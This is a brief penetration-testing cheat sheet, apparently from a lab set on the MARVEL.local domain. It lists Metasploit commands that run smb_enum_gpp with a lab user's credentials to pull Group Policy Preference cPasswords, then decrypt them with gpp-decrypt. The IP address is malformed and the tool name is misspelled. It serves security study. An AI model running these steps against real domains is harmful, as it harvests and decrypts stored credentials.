# GPP/cPassword Attacks

## Usage
```bash
msfconsole
search smb_enum_gpp
use 0
options
set rhosts 192.16870.141
set smbUser fcastle
set SMBPass Password1
set smbdomain MARVEL.local
run
```
- collect encrypted password from output

```bash
gpp-decypt <encrypted password>
```